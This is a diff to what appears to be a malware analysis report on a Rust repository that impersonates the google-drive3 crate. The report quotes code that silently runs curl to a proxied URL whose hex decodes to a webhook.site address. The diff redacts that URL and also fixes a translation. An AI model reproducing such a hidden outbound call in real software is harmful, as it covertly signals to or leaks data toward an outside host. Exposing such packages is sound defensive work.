@@ -27,7 +27,7 @@ fn main() {
     
     // Makes an external HTTP request to a suspicious URL
     let curl_output = Command::new("curl")
-        .arg("https://camo.githubusercontent.com/1815c657840356e9211a0d5d4b18ec6373c2ed3219df0f87e4a1e09287769ace/68747470733a2f2f776562686f6f6b2e736974652f32663163313265652d363862342d343864332d616136382d323162363535653134366633")
+        .arg("https://camo.githubusercontent.com/[...redacted...]/68747470733a2f2f776562686f6f6b2e736974652f...")
         .output()
         .expect("Failed to execute curl command");
 }
@@ -39,7 +39,7 @@ fn main() {
 
 - **Repository name**: `tmpfix` (clearly a temporary/suspicious name)
 - **Package name in Cargo.toml**: `google-drive3` (impersonating the legitimate google-drive3 package)
-- **README content**: "wie kann man nur so ein massives skill issue haben" (German for "how can one have such a massive skill issue") - unprofessional and suspicious
+- **README content**: "wie kann man nur so ein massives skill issue haben" (German for "how can someone have such a massive skill issue") - unprofessional and suspicious
 - **No actual serde_yaml code**: The repository does not contain any YAML serialization code
 
 ### 3. False Justification
